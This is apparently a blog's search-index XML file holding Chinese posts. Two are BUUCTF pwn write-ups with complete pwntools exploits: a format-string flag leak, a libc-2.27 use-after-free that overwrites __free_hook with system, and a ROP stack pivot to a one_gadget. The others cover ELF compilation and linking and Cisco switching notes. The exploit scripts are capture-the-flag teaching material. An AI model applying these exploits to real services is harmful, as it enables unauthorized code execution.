<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>pwn1</title>
      <link href="2021/03/13/pwn1/"/>
      <url>2021/03/13/pwn1/</url>
      
        <content type="html"><![CDATA[<p>记录下buuctf pwn的write up</p><h2 id="judgement-mna-2016"><a href="#judgement-mna-2016" class="headerlink" title="judgement_mna_2016"></a>judgement_mna_2016</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// esp</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> format; <span class="comment">// [esp+0h] [ebp-4Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+40h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *v7; <span class="comment">// [esp+44h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = &amp;argc;</span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v3 = alloca(<span class="number">144</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Flag judgment system\nInput flag &gt;&gt; &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( getnline(&amp;format, <span class="number">0x40</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(&amp;format);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;format, flag) )</span><br><span class="line">      result = <span class="built_in">puts</span>(<span class="string">&quot;\nCorrect flag!!&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      result = <span class="built_in">puts</span>(<span class="string">&quot;\nWrong flag...&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Unprintable character&quot;</span>);</span><br><span class="line">    result = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逻辑就是之前把flag文件读入内存，然后输入字符串和flag字符串进行对比<br>主函数存在格式化字符串漏洞，我们直接在栈上找到格式化字符串参数的位置，然后直接读出来即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./judgement_mna_2016&quot;</span></span><br><span class="line">port = <span class="string">&quot;29113&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Input flag &gt;&gt; &quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;%28$s&quot;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-en-3"><a href="#ciscn-2019-en-3" class="headerlink" title="ciscn_2019_en_3"></a>ciscn_2019_en_3</h2><ul><li>考点<ol><li>程序调试，栈溢出泄漏地址</li><li>libc-2.27 UAF</li></ol></li></ul><p><a href="https://sm.ms/image/iCz5hIJNQDXTvlr" target="_blank"><img src="https://i.loli.net/2021/03/14/iCz5hIJNQDXTvlr.png" /></a></p><p>程序先给了一个输入name和id的东西，发现了格式化字符串但是由于是__printf_chk，所以没找到好的利用点<br>然后下面是输入id，还有个puts，调试发现id后面是有libc函数setbuffer的，又因为是puts函数直接来给他泄漏出来<br><a href="https://sm.ms/image/3nmz2dy6jRKb9Pi" target="_blank"><img src="https://i.loli.net/2021/03/14/3nmz2dy6jRKb9Pi.png" /></a></p><p>add功能只允许申请0-0x50大小的chunk<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line">  <span class="keyword">if</span> ( size &lt; <span class="number">0</span> &amp;&amp; size &gt; <span class="number">0x50</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><br>delete功能存在UAF<br>在老版的libc-2.27下是允许double free存在的<br>然后直接改__free_hook为system一把梭就行了<br>新版的打完今天的VN再试一下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./ciscn_2019_en_3&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;../libc-2.27.so&#x27;</span></span><br><span class="line">port = <span class="string">&quot;27391&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_libc</span>(<span class="params">addr</span>):</span></span><br><span class="line"><span class="keyword">global</span> libc_base,__malloc_hook,__free_hook,system,binsh_addr,_IO_2_1_stdout_</span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line">libc_base = addr - libc.sym[<span class="string">&#x27;setbuffer&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*] libc base:&quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">__malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment"># binsh_addr = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()</span></span><br><span class="line">__free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">_IO_2_1_stdout_ = libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your choice&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please input the size of story:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">p.sendafter(<span class="string">&#x27;please inpute the story:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your choice:&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please input the index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;What&#x27;s your name?&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;A13x&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Please input your ID.&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;aaaaaaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">leak = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) - <span class="number">231</span></span><br><span class="line">leak_libc(leak)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,p64(__free_hook))</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&quot;A13x&quot;</span>)</span><br><span class="line">add(<span class="number">0x50</span>,p64(system))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-actf栈迁移</title>
      <link href="2021/03/12/pwn-actf%E6%A0%88%E8%BF%81%E7%A7%BB/"/>
      <url>2021/03/12/pwn-actf%E6%A0%88%E8%BF%81%E7%A7%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>给出exp如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./ACTF_2019_babystack&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;../libc-2.27.so&#x27;</span></span><br><span class="line">port = <span class="string">&quot;29886&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_libc</span>(<span class="params">addr</span>):</span></span><br><span class="line"><span class="keyword">global</span> libc_base,__malloc_hook,__free_hook,system,binsh_addr,_IO_2_1_stdout_</span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line">libc_base = addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*] libc base:&quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">__malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment"># binsh_addr = libc_base + libc.search(&#x27;/bin/sh&#x27;).next()</span></span><br><span class="line">__free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">_IO_2_1_stdout_ = libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line"></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0xe0</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Your message will be saved at 0x&quot;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),base = <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400ad3</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">leave_ret = <span class="number">0x0000000000400a18</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload = payload + p64(<span class="number">0</span>)</span><br><span class="line">payload = payload + p64(pop_rdi_ret)</span><br><span class="line">payload = payload + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload = payload + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload = payload + p64(<span class="number">0x4008f6</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0xd0</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload = payload + p64(stack)</span><br><span class="line">payload = payload + p64(leave_ret)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">leak = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">leak_libc(leak)</span><br><span class="line">og = libc_base + <span class="number">0x4f2c5</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0xe0</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">p.send(<span class="number">0xd8</span> * <span class="string">b&#x27;\x00&#x27;</span> + p64(og))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="分析回顾栈迁移"><a href="#分析回顾栈迁移" class="headerlink" title="分析回顾栈迁移"></a>分析回顾栈迁移</h2><p>没有开PIE保护和Canary</p><ul><li>IDA分析结果如下<br><img src="https://i.loli.net/2021/03/12/zGy2nY6fm3SCPN5.png" /></li></ul><p>题目给出栈地址，我们可以将栈迁移到栈上，布置gadget泄漏libc地址然后one_gadget一把梭</p><ul><li>栈帧结构如下<br><img src="https://i.loli.net/2021/03/12/FjcnmS6bw1JlXxa.png" /></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 栈迁移 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二进制程序从源文件到可执行程序的过程</title>
      <link href="2021/03/09/binary-programming/"/>
      <url>2021/03/09/binary-programming/</url>
      
        <content type="html"><![CDATA[<p>在c语言中，我们都知道一个源程序从源码到可执行文件都要经历预处理，编译，汇编和链接的过程，最终形成可执行文件，然后才被操作系统装载进内存运行。</p><p>为了复习pwn知识，写个文章来探究一下经常被我忽略的关于程序的中间过程。</p><h2 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h2><p>该过程主要处理源代码中以’#’开始的预编译指令<br>具体处理规则如下：</p><ul><li>删除#define并展开所有的宏定义</li><li>处理所有条件预编译指令：如 “#if”等</li><li>处理”#include”预编译指令，将被包含的文件插入到该预编译指令的位置</li><li>删除注释，添加行号和文件名标识</li></ul><p>预编译的过程可用如下指令来执行 </p><p><code>gcc -E BinaryName.c -o BinaryName.i</code></p><p>源代码如下：<br><img src="https://i.loli.net/2021/03/09/AMG6ofRz71mCxev.png" style="zoom:50%;"/></p><p>经过预编译后：<br><img src="https://i.loli.net/2021/03/09/oQRzCvZfhs38HTy.png" style="zoom:50%;"/></p><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>编译过程经过一系列词法分析等步骤生成汇编代码文件，是程序构建的核心部分<br>不同的操作系统有不同的编译器，比如Linux下的gcc，g++，Windows下的MSVCCL等（后文都以Linux平台下来探究）<br>我们可以使用<code>gcc -S BinaryName.i -o BinaryName.s</code>或者<code>gcc -S BinaryName -o BinaryName.s</code>来查看经过编译后的文件</p><p><img src="https://i.loli.net/2021/03/09/bps3QmPGn5ScZJr.png" style="zoom:50%;"/></p><h2 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h2><p>汇编过程可以将汇编代码转变为机器可以执行的指令<br><code>gcc -c BinaryName.s -o BinaryName.o</code>或<br><code>gcc -c BinaryName.c -o BinaryName.o</code></p><h2 id="目标文件"><a href="#目标文件" class="headerlink" title="目标文件"></a>目标文件</h2><p>我们先看下c语言源代码中的变量和函数</p><h3 id="c语言源代码中的变量和函数"><a href="#c语言源代码中的变量和函数" class="headerlink" title="c语言源代码中的变量和函数"></a>c语言源代码中的变量和函数</h3><ul><li>声明和定义的区别：<ul><li>声明是告诉编译器该变量没有在当前文件中定义而是在其他文件中定义</li><li>定义变量是告诉编译器在生成的目标文件中留出空间来存放该变量</li><li>定义函数是告诉编译器在目标文件中生成该函数的二进制代码</li></ul></li></ul><p>变量类型如下：</p><ol><li>全局变量：非static，表示该变量的生命周期是整个程序的执行期间，可以被其他文件访问</li><li>全局变量：static，生命周期也是整个程序的执行期间，但是不能被其他文件访问</li><li>局部变量：static，生命周期是程序的执行期间，但是作用域仅在该函数体中</li><li>局部变量：非static，仅存在于当前当前函数体中</li></ol><p>对于函数也同理，如果定义了static则无法被其他文件所读取</p><h3 id="目标文件的格式"><a href="#目标文件的格式" class="headerlink" title="目标文件的格式"></a>目标文件的格式</h3><p>部分段名如下</p><ul><li>.data段保存已经初始化的全局静态变量和局部静态变量</li><li>.rodata段存放的是只读数据，一般是程序里面的只读变量（const修饰的）和字符串常量</li><li>.bss段存放的是未初始化的全局变量和局部静态变量</li><li>.comment存放的是编译器版本信息</li><li>.debug存放调试信息</li><li>.dynamic存放动态链接信息</li><li>.strtab String Table字符串表，用于存放ELF文件中用到的各种字符串</li><li>.symtab Symbol Table符号表</li><li>.plt .got 动态链接的跳转表和全局入口表</li><li>.init 程序初始化段</li><li>.fini 程序终结代码段</li></ul><p>ELF文件头结构体如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>        e_ident[EI_NIDENT];        <span class="comment">/* Magic number and other info */</span></span><br><span class="line">  Elf32_Half        e_type;                        <span class="comment">/* Object file type */</span></span><br><span class="line">  Elf32_Half        e_machine;                <span class="comment">/* Architecture */</span></span><br><span class="line">  Elf32_Word        e_version;                <span class="comment">/* Object file version */</span></span><br><span class="line">  Elf32_Addr        e_entry;                <span class="comment">/* Entry point virtual address */</span></span><br><span class="line">  Elf32_Off        e_phoff;                <span class="comment">/* Program header table file offset */</span></span><br><span class="line">  Elf32_Off        e_shoff;                <span class="comment">/* Section header table file offset */</span></span><br><span class="line">  Elf32_Word        e_flags;                <span class="comment">/* Processor-specific flags */</span></span><br><span class="line">  Elf32_Half        e_ehsize;                <span class="comment">/* ELF header size in bytes */</span></span><br><span class="line">  Elf32_Half        e_phentsize;                <span class="comment">/* Program header table entry size */</span></span><br><span class="line">  Elf32_Half        e_phnum;                <span class="comment">/* Program header table entry count */</span></span><br><span class="line">  Elf32_Half        e_shentsize;                <span class="comment">/* Section header table entry size */</span></span><br><span class="line">  Elf32_Half        e_shnum;                <span class="comment">/* Section header table entry count */</span></span><br><span class="line">  Elf32_Half        e_shstrndx;                <span class="comment">/* Section header string table index */</span></span><br><span class="line">&#125; Elf32_Ehdr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>        e_ident[EI_NIDENT];        <span class="comment">/* Magic number and other info */</span></span><br><span class="line">  Elf64_Half        e_type;                        <span class="comment">/* Object file type */</span></span><br><span class="line">  Elf64_Half        e_machine;                <span class="comment">/* Architecture */</span></span><br><span class="line">  Elf64_Word        e_version;                <span class="comment">/* Object file version */</span></span><br><span class="line">  Elf64_Addr        e_entry;                <span class="comment">/* Entry point virtual address */</span></span><br><span class="line">  Elf64_Off        e_phoff;                <span class="comment">/* Program header table file offset */</span></span><br><span class="line">  Elf64_Off        e_shoff;                <span class="comment">/* Section header table file offset */</span></span><br><span class="line">  Elf64_Word        e_flags;                <span class="comment">/* Processor-specific flags */</span></span><br><span class="line">  Elf64_Half        e_ehsize;                <span class="comment">/* ELF header size in bytes */</span></span><br><span class="line">  Elf64_Half        e_phentsize;                <span class="comment">/* Program header table entry size */</span></span><br><span class="line">  Elf64_Half        e_phnum;                <span class="comment">/* Program header table entry count */</span></span><br><span class="line">  Elf64_Half        e_shentsize;                <span class="comment">/* Section header table entry size */</span></span><br><span class="line">  Elf64_Half        e_shnum;                <span class="comment">/* Section header table entry count */</span></span><br><span class="line">  Elf64_Half        e_shstrndx;                <span class="comment">/* Section header string table index */</span></span><br><span class="line">&#125; Elf64_Ehdr;</span><br></pre></td></tr></table></figure><p>ELF header结构体如下<br><img src="https://i.loli.net/2021/03/09/VwWutzkDLN934Zy.png" style="zoom:50%;" /></p><h3 id="源代码到目标文件的处理"><a href="#源代码到目标文件的处理" class="headerlink" title="源代码到目标文件的处理"></a>源代码到目标文件的处理</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> globalA = <span class="number">2333</span>;</span><br><span class="line"><span class="keyword">int</span> globalB;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> globalC = <span class="number">666</span>;  <span class="comment">// 全局static</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> globalD;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">int</span> globalE; <span class="comment">// 声明全局变量</span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">Print</span><span class="params">()</span></span>; <span class="comment">// 声明函数</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">int</span> a)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> a = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> b;</span><br><span class="line"><span class="keyword">int</span> c = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> d;</span><br><span class="line">test(<span class="number">12</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过nm命令来查看目标文件的符号，从左到右分别是变量的相对地址，变量所在段的名字和变量名字。<br><img src="https://i.loli.net/2021/03/09/15H7DNjxQdUslnV.png" style="zoom:50%;" ></p><p>其中a.1922是编译器修改变量名字的结果，因为a是一个局部静态变量，作用域在他的函数体中，所以当我们在不同的函数体中声明相同名字的局部静态变量（这种操作是被允许的）而且其生命周期为整个程序执行时，编译器为了支持这种功能，所以来加后缀来标识不同的局部静态变量。</p><p>我们还可以用objdump来查看目标文件的结构，-h参数可查看各个段的基本信息</p><p><img src="https://i.loli.net/2021/03/09/5GTWh29juR6pxUZ.png" style="zoom:50%;" /></p><p>Size表示段长度<br>File off表示在文件中的偏移<br>每个段第二行中的”CONTENTS” “ALLOC”等表示段的属性，”CONTENTS”表示在文件中存在<br>比如数据段的大小为0xc字节大小，因为有三个四字节的变量分别为globalA,globalC和a</p><h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p>使用如下命令来完成链接过程<br><code>gcc Binary.o -o BinaryName</code></p><p><img src="https://i.loli.net/2021/03/09/4MySVpGcZOiLqQr.png" style="zoom:50%;" /></p><p>可以看到之前的一些相对地址全部变为了绝对地址，完成了地址重定位</p><h2 id="装载运行"><a href="#装载运行" class="headerlink" title="装载运行"></a>装载运行</h2><p>当程序加载进内存程序即可运行，在这个过程中我们不得不提到虚拟内存，动态链接库和函数执行的问题。我们给出程序执行的顺序，具体探究我们等到之后的文章再另行分析。</p><blockquote><p>  1.首先 bash 进行 fork 系统调用，生成一个子进程，接着在子进程中运行 execve 函数指定的 elf 二进制程序（ Linux中执行二进制程序最终都是通过 execve 这个库函数进行的），execve 会调用系统调用把 elf 文件 load 到内存中的代码段(_text)中。<br>2.如果有依赖的动态链接库，会调用动态链接器进行库文件的地址映射，动态链接库的内存空间是被多个进程共享的。<br>3.内核从 elf 文件头得到_start的地址，调度执行流从_start指向的地址开始执行，执行流在_start执行的代码段中跳转到libc中的公共初始化代码段<strong>libc_start_main，进行程序运行前的初始化工作。<br>4.</strong>libc_start_main的执行过程中，会跳转到_init中全局变量的初始化工作，随后调用我们的main函数，进入到主函数的指令流程。</p></blockquote><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>《程序员的自我修养》</li><li><a href="https://www.nosuchfield.com/2018/11/23/Program-compilation-linking-loading-and-running/">https://www.nosuchfield.com/2018/11/23/Program-compilation-linking-loading-and-running/</a></li><li><a href="https://tech.meituan.com/2015/01/22/linker.html">https://tech.meituan.com/2015/01/22/linker.html</a></li><li><a href="https://code.woboq.org/">https://code.woboq.org/</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 二进制 </tag>
            
            <tag> 程序与操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>路由与交换课堂笔记</title>
      <link href="2021/03/09/RouterSwitch/"/>
      <url>2021/03/09/RouterSwitch/</url>
      
        <content type="html"><![CDATA[<h1 id="二-网络设备配置与管理"><a href="#二-网络设备配置与管理" class="headerlink" title="二.网络设备配置与管理"></a>二.网络设备配置与管理</h1><h2 id="Cisco-IOS简介"><a href="#Cisco-IOS简介" class="headerlink" title="Cisco IOS简介"></a>Cisco IOS简介</h2><p>Cisco Internetwork Operatiing System (IOS) </p><h2 id="操作模式"><a href="#操作模式" class="headerlink" title="操作模式"></a>操作模式</h2><ul><li>用户模式：<ul><li>Router&gt;enable     #进入特权模式</li></ul></li><li>特权模式</li><li>全局配置模式</li><li>其他配置模式</li></ul><blockquote><p>退出指令：</p><p>​    disable：由特权模式到用户模式</p><p>​    exit：一级一级退出，在特权模式下断开连接</p><p>​    end：直接退到特权模式</p></blockquote><h1 id="三-交换技术基础"><a href="#三-交换技术基础" class="headerlink" title="三.交换技术基础"></a>三.交换技术基础</h1><h2 id="3-学习目标"><a href="#3-学习目标" class="headerlink" title="3.学习目标"></a>3.学习目标</h2><ul><li>掌握交换机工作原理</li><li>熟悉Cisco LAN交换机启动顺序</li><li>熟练掌握交换机基本配置</li><li>掌握SSH管理Cisco LAN交换机</li><li>了解交换网络的最佳时间</li><li>掌握Cisco LAN交换机端口安全</li></ul><h2 id="3-1交换机简介"><a href="#3-1交换机简介" class="headerlink" title="3.1交换机简介"></a>3.1交换机简介</h2><p>集线器没有mac地址表，交换机有，使用集线器时两台主机通信时网络中所有主机都可收到消息</p><h3 id="1-交换"><a href="#1-交换" class="headerlink" title="1.交换"></a>1.交换</h3><ul><li><p>交换机mac地址表</p><ul><li>默认： 空</li><li><p>学习：帧中的源MAC地址和进入端口号</p></li><li><p>转发：查表</p><ul><li>表中没有记录或广播帧<ul><li>除源端口之外的其他端口转发</li></ul></li><li>表中有记录<ul><li>转向相应端口</li><li>或被过滤掉：目标MAC地址对应的端口和进入的端口是同一个端口</li></ul></li></ul></li></ul></li></ul><h3 id="2-交换机转发方法"><a href="#2-交换机转发方法" class="headerlink" title="2.交换机转发方法"></a>2.交换机转发方法</h3><ul><li>交换机上数据帧转发方法<ul><li>存储转发交换<ul><li>数据缓冲 错误检查</li></ul></li><li>快速转发交换<ul><li>一旦检查到目标MAC地址就执行转发</li></ul></li><li>免分片交换<ul><li>数据帧长度达到64字节</li></ul></li></ul></li></ul><h3 id="4-分层网络设计"><a href="#4-分层网络设计" class="headerlink" title="4.分层网络设计"></a>4.分层网络设计</h3><ul><li>接入层<ul><li>网络边缘，流量将从这里进出园区网</li><li>面向用户的接入控制技术</li></ul></li><li>分布层<ul><li>隔离广播</li><li>路由</li><li>面向子网的网络访问策略</li></ul></li><li>核心层<ul><li>网络主干</li><li>主要用途是提供错误隔离和高速主干连接</li></ul></li></ul><h2 id="3-2交换机基本配置"><a href="#3-2交换机基本配置" class="headerlink" title="3.2交换机基本配置"></a>3.2交换机基本配置</h2><h3 id="1-交换机启动顺序"><a href="#1-交换机启动顺序" class="headerlink" title="1.交换机启动顺序"></a>1.交换机启动顺序</h3><ul><li>交换机启动顺序<ul><li>Power-on self test</li><li>运行启动加载起软件<ul><li>启动加载器执行低级CPU初始化</li><li>启动加载器初始化闪存文件系统</li></ul></li><li>启动加载器定位并加载默认IOS操作系统软件映像到内存，而且将对交换机的控制权交给IOS</li></ul></li></ul><h3 id="2-配置"><a href="#2-配置" class="headerlink" title="2.配置"></a>2.配置</h3><ul><li><p>初始配置</p><ul><li>PC 